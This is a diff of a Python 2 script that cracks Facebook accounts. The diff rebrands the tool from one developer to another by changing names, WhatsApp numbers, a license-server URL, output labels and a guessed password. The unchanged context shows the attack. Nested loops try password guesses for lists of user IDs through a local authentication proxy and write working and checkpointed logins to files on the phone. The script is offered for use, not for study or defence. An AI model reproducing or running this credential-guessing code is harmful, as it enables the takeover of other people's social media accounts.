@@ -24,19 +24,20 @@ reload(sys)
 sys.setdefaultencoding("utf8")
 os.system('clear')
 logo = """
- \x1b[0;32m     _______  _______  _______ _________
- \x1b[0;31m    (  ____ \(  ___  )(       )\__   __/
- \x1b[0;33m    | (    \/| (   ) || () () |   ) (   
- \x1b[0;34m    | (_____ | |   | || || || |   | |   
- \x1b[0;35m    (_____  )| |   | || |(_)| |   | |   
- \x1b[0;36m          ) || |   | || |   | |   | |   
- \x1b[0;31m    /\____) || (___) || )   ( |___) (___
- \x1b[0;33m    \_______)(_______)|/     \|\_______/
-     \x1b[101m\x1b[37;1mCODED BY SOMI-AWAN\x1b[0m
+ \x1b[0;32m     _____ ______  _____ ______  _____
+ \x1b[0;31m    (     )|    | (    )(      )(     /
+ \x1b[0;31m.   (     )|    | (    )(      )(    /
+ \x1b[0;33m    (     )|____| (    )(      )(   /
+ \x1b[0;34m    (_____)| \    ( _ / (______)(__ /
+ \x1b[0;35m    (     )|  \   (   \ (      )(   \
+ \x1b[0;36m    (     )|   \  (    )(      )(    \
+ \x1b[0;31m    (     )|    \ (____)(      )(____/
+ \x1b[0;33m         
+     \x1b[101m\x1b[37;1mCODED BY ARBAB-MEMON\x1b[0m
 \033[1;97m-----------------------------------------------
-\x1b[0;35m⋟ DEVOLPER   :  SOMI AWAN
-\x1b[0;35m⋟ WHATSAAP   :  03455453538
-\x1b[0;35m⋟ FACEBOOK   :  https://www.facebook.com/SO MI
+\x1b[0;35m⋟ DEVOLPER   :  ARBAB MEMON
+\x1b[0;35m⋟ WHATSAAP   :  03003023263
+\x1b[0;35m⋟ FACEBOOK   :  ARBAB MEMON
 \033[1;97m-----------------------------------------------
 """
 
@@ -55,7 +56,7 @@ def reg():
     except (KeyError, IOError):
         reg2()
 
-    r = requests.get('https://raw.githubusercontent.com/S-O-M-i/pro7/main/.server.txt').text
+    r = requests.get('https://raw.githubusercontent.com/Ethical-404/PROHACK/main/.server.txt').text
     if to in r:
         os.system('cd ..... && npm install')
         os.system('fuser -k 5000/tcp &')
@@ -76,7 +77,7 @@ def reg():
         print ' \x1b[1;92mYour id: \x1b[0;36m' + to
         print ''
         raw_input('\x1b[1;93m Press enter to send id')
-        os.system('xdg-open https://wa.me/+923455453538')
+        os.system('xdg-open https://wa.me/+923003023263')
         reg()
 
 
@@ -92,7 +93,7 @@ def reg2():
     print ' Your id: ' + id
     print ''
     raw_input(' Press enter to go to whatsapp ')
-    os.system('xdg-open https://wa.me/+923455454548')
+    os.system('xdg-open https://wa.me/+923003023263')
     sav = open('/sdcard/.vgkekdlppowjujebeu3beb.txt', 'w')
     sav.write(id)
     sav.close()
@@ -334,14 +335,14 @@ def crack_select():
 			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
 			q = json.loads(data)
 			if "loc" in q:
-				print("\033[1;32m(SOMI-OK) "+uid+" | "+pass1+"\033[0;97m")
+				print("\033[1;32m(ARBAB-OK) "+uid+" | "+pass1+"\033[0;97m")
 				ok = open("/sdcard/ids/checkpoint.txt", "a")
 				ok.write(uid+" | "+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error"]:
-					print("\x1b[0;36m(SOMI-CP) "+uid+" | "+pass1)
+					print("\x1b[0;36m(ARBAB-CP) "+uid+" | "+pass1)
 					cp = open("checkpoint.txt","a")
 					cp.write(uid+" | "+pass1+"\n")
 					cp.close()
@@ -351,14 +352,14 @@ def crack_select():
 					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
 					q = json.loads(data)
 					if "loc" in q:
-						print("\033[1;32m(SOMI-OK) "+uid+" | "+pass2+"\033[0;97m")
+						print("\033[1;32m(ARBAB-OK) "+uid+" | "+pass2+"\033[0;97m")
 						ok = open("/sdcard/ids/somi.txt", "a")
 						ok.write(uid+" | "+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error"]:
-							print("\x1b[0;36m(SOMI-CP) "+uid+" | "+pass2)
+							print("\x1b[0;36m(ARBAB-CP) "+uid+" | "+pass2)
 							cp = open("checkpoint.txt","a")
 							cp.write(uid+" | "+pass2+"\n")
 							cp.close()
@@ -368,14 +369,14 @@ def crack_select():
 							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
 							q = json.loads(data)
 							if "loc" in q:
-								print("\033[1;32m(SOMI-OK) "+uid+" | "+pass3+"\033[0;97m")
+								print("\033[1;32m(ARBAB-OK) "+uid+" | "+pass3+"\033[0;97m")
 								ok = open("/sdcard/ids/checkpoint.txt", "a")
 								ok.write(uid+" | "+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in q["error"]:
-									print("\x1b[0;36m(SOMI-CP) "+uid+" | "+pass3)
+									print("\x1b[0;36m(ARBAB-CP) "+uid+" | "+pass3)
 									cp = open("checkpoint.txt","a")
 									cp.write(uid+" | "+pass3+"\n")
 									cp.close()
@@ -385,14 +386,14 @@ def crack_select():
 									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
 									q = json.loads(data)
 									if "loc" in q:
-										print("\033[1;32m(SOMI-OK) "+uid+" | "+pass4+"\033[0;97m")
+										print("\033[1;32m(ARBAB-OK) "+uid+" | "+pass4+"\033[0;97m")
 										ok = open("/sdcard/ids/checkpoint.txt", "a")
 										ok.write(uid+" | "+pass4+"\n")
 										ok.close()
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in q["error"]:
-											print("\x1b[0;36m(SOMI-CP) "+uid+" | "+pass4)
+											print("\x1b[0;36m(ARBAB-CP) "+uid+" | "+pass4)
 											cp = open("checkpoint.txt","a")
 											cp.write(uid+" | "+pass4+"\n")
 											cp.close()
@@ -402,31 +403,31 @@ def crack_select():
 											data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
 											q = json.loads(data)
 											if "loc" in q:
-												print("\033[1;32m(SOMI-OK) "+uid+" | "+pass5+"\033[0;97m")
+												print("\033[1;32m(ARBAB-OK) "+uid+" | "+pass5+"\033[0;97m")
 												ok = open("/sdcard/ids/checkpoint.txt", "a")
 												ok.write(uid+" | "+pass5+"\n")
 												ok.close()
 												oks.append(uid+pass5)
 											else:
 												if "www.facebook.com" in q["error"]:
-													print("\x1b[0;36m(SOMI-CP) "+uid+" | "+pass5)
+													print("\x1b[0;36m(ARBAB-CP) "+uid+" | "+pass5)
 													cp = open("checkpoint.txt","a")
 													cp.write(uid+" | "+pass5+"\n")
 													cp.close()
 													cps.append(uid+pass6)
 												else:
-													pass6 = "000786"
+													pass6 = "445566"
 													data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass6).text
 													q = json.loads(data)
 													if "loc" in q:
-														print("\033[1;32m(SOMI-OK) "+uid+" | "+pass6+"\033[0;97m")
+														print("\033[1;32m(ARBAB-OK) "+uid+" | "+pass6+"\033[0;97m")
 														ok = open("/sdcard/ids/checkpoint.txt", "a")
 														ok.write(uid+" | "+pass6+"\n")
 														ok.close()
 														oks.append(uid+pass6)
 													else:
 														if "www.facebook.com" in q["error"]:
-															print("\x1b[0;36m(SOMI-CP) "+uid+" | "+pass6)
+															print("\x1b[0;36m(ARBAB-CP) "+uid+" | "+pass6)
 															cp = open("checkpoint.txt","a")
 															cp.write(uid+" | "+pass6+"\n")
 															cp.close()
@@ -436,14 +437,14 @@ def crack_select():
 															data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass7, headers=header).text
 															q = json.loads(data)
 															if "loc" in q:
-																print("\033[1;32m(SOMI-OK) "+uid+" | "+pass7+"\033[0;97m")
+																print("\033[1;32m(ARBAB-OK) "+uid+" | "+pass7+"\033[0;97m")
 																ok = open("/sdcard/ids/checkpoint.txt", "a")
 																ok.write(uid+" | "+pass7+"\n")
 																ok.close()
 																oks.append(uid+pass7)
 															else:
 																if "www.facebook.com" in q["error"]:
-																	print("\x1b[0;36m(SOMI-CP) "+uid+" | "+pass7)
+																	print("\x1b[0;36m(ARBAB-CP) "+uid+" | "+pass7)
 																	cp = open("checkpoint.txt","a")
 																	cp.write(uid+" | "+pass7+"\n")
 																	cp.close()
@@ -627,14 +628,14 @@ def choice_select():
 			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
 			q = json.loads(data)
 			if "loc" in q:
-				print("\033[1;32m(SOMI-OK) "+uid+" | "+pass1+"\033[0;97m")
+				print("\033[1;32m(ARBAB-OK) "+uid+" | "+pass1+"\033[0;97m")
 				ok = open("/sdcard/ids/checkpoint.txt", "a")
 				ok.write(uid+" | "+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error"]:
-					print("\x1b[0;36m(SOMI-CP) "+uid+" | "+pass1)
+					print("\x1b[0;36m(ARBAB-CP) "+uid+" | "+pass1)
 					cp = open("checkpoint.txt","a")
 					cp.write(uid+" | "+pass1+"\n")
 					cp.close()
@@ -644,14 +645,14 @@ def choice_select():
 					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
 					q = json.loads(data)
 					if "loc" in q:
-						print("\033[1;32m(SOMI-OK) "+uid+" | "+pass2+"\033[0;97m")
+						print("\033[1;32m(ARBAB-OK) "+uid+" | "+pass2+"\033[0;97m")
 						ok = open("/sdcard/ids/checkpoint.txt", "a")
 						ok.write(uid+" | "+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error"]:
-							print("\x1b[0;36m(SOMI-CP) "+uid+" | "+pass2)
+							print("\x1b[0;36m(ARBAB-CP) "+uid+" | "+pass2)
 							cp = open("checkpoint.txt","a")
 							cp.write(uid+" | "+pass2+"\n")
 							cp.close()
@@ -661,14 +662,14 @@ def choice_select():
 							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
 							q = json.loads(data)
 							if "loc" in q:
-								print("\033[1;32m(SOMI-OK) "+uid+" | "+pass3+"\033[0;97m")
+								print("\033[1;32m(ARBAB-OK) "+uid+" | "+pass3+"\033[0;97m")
 								ok = open("/sdcard/ids/checkpoint.txt", "a")
 								ok.write(uid+" | "+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in q["error"]:
-									print("\x1b[0;36m(SOMI-CP) "+uid+" | "+pass3)
+									print("\x1b[0;36m(ARBAB-CP) "+uid+" | "+pass3)
 									cp = open("checkpoint.txt","a")
 									cp.write(uid+" | "+pass3+"\n")
 									cp.close()
@@ -678,14 +679,14 @@ def choice_select():
 									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
 									q = json.loads(data)
 									if "loc" in q:
-										print("\033[1;32m(SOMI-OK) "+uid+" | "+pass4+"\033[0;97m")
+										print("\033[1;32m(ARBAB-OK) "+uid+" | "+pass4+"\033[0;97m")
 										ok = open("/sdcard/ids/checkpoint.txt", "a")
 										ok.write(uid+" | "+pass4+"\n")
 										ok.close()
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in q["error"]:
-											print("\x1b[0;36m(SOMI-CP) "+uid+" | "+pass4)
+											print("\x1b[0;36m(ARBAB-CP) "+uid+" | "+pass4)
 											cp = open("checkpoint.txt","a")
 											cp.write(uid+" | "+pass4+"\n")
 											cp.close()
@@ -695,14 +696,14 @@ def choice_select():
 											data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
 											q = json.loads(data)
 											if "loc" in q:
-												print("\033[1;32m(SOMI-OK) "+uid+" | "+pass5+"\033[0;97m")
+												print("\033[1;32m(ARBAB-OK) "+uid+" | "+pass5+"\033[0;97m")
 												ok = open("/sdcard/ids/checkpoint.txt", "a")
 												ok.write(uid+" | "+pass5+"\n")
 												ok.close()
 												oks.append(uid+pass5)
 											else:
 												if "www.facebook.com" in q["error"]:
-													print("\x1b[0;36m(SOMI-CP) "+uid+" | "+pass5)
+													print("\x1b[0;36m(ARBAB-CP) "+uid+" | "+pass5)
 													cp = open("checkpoint.txt","a")
 													cp.write(uid+" | "+pass5+"\n")
 													cp.close()
@@ -712,14 +713,14 @@ def choice_select():
 													data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass6).text
 													q = json.loads(data)
 													if "loc" in q:
-														print("\033[1;32m(SOMI-OK) "+uid+" | "+pass6+"\033[0;97m")
+														print("\033[1;32m(ATBAB-OK) "+uid+" | "+pass6+"\033[0;97m")
 														ok = open("/sdcard/ids/checkpoint.txt", "a")
 														ok.write(uid+" | "+pass6+"\n")
 														ok.close()
 														oks.append(uid+pass6)
 													else:
 														if "www.facebook.com" in q["error"]:
-															print("\x1b[0;36m(SOMI-CP) "+uid+" | "+pass6)
+															print("\x1b[0;36m(ARBAB-CP) "+uid+" | "+pass6)
 															cp = open("checkpoint.txt","a")
 															cp.write(uid+" | "+pass6+"\n")
 															cp.close()
@@ -728,14 +729,14 @@ def choice_select():
 															data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass7, headers=header).text
 															q = json.loads(data)
 															if "loc" in q:
-																print("\033[1;32m(SOMI-OK) "+uid+" | "+pass7+"\033[0;97m")
+																print("\033[1;32m(ARBAB-OK) "+uid+" | "+pass7+"\033[0;97m")
 																ok = open("/sdcard/ids/checkpoint.txt", "a")
 																ok.write(uid+" | "+pass7+"\n")
 																ok.close()
 																oks.append(uid+pass7)
 															else:
 																if "www.facebook.com" in q["error"]:
-																	print("\x1b[0;36m(SOMI-CP) "+uid+" | "+pass7)
+																	print("\x1b[0;36m(ARBAB-CP) "+uid+" | "+pass7)
 																	cp = open("checkpoint.txt","a")
 																	cp.write(uid+" | "+pass7+"\n")
 																	cp.close()
@@ -760,4 +761,5 @@ def choice_select():
 	choice()
 if __name__ == '__main__':
 	reg()
-
+### YOU Cnt Decompile it
+### Tera Baap 
